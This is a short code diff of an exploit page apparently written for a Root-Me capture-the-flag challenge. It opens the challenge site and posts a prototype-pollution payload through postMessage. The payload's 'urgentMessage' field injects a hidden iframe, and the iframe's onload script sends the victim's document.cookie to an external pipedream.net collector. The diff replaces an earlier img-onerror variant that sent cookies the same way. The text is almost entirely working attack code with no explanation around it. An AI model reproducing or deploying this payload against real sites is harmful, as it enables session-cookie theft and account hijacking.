@@ -9,11 +9,11 @@
        window.onload = function() {
             const target = window.open('http://node2.challenges.ctf20k.root-me.org:36975/');
 
-            setTimeout(() => {
+           setTimeout(() => {
                 target.postMessage(`
                     {
                         "__proto__":{
-                            "urgentMessage":"<img src='https://eotqkw100h253ph.m.pipedream.net?cookies=' + encodeURIComponent(document.cookie) onerror='this.onerror=null;var xhr=new XMLHttpRequest();xhr.open(\"POST\", \"https://eotqkw100h253ph.m.pipedream.net\", true);xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");xhr.send(\"cookies=\"+encodeURIComponent(document.cookie));' />"
+                            "urgentMessage":"<iframe src='javascript:void(0)' onload='var xhr=new XMLHttpRequest();xhr.open(\"POST\", \"https://eotqkw100h253ph.m.pipedream.net\", true);xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");xhr.send(\"cookies=\"+encodeURIComponent(document.cookie));' style='display:none'></iframe>"
                         }
                     }
                 `, '*');
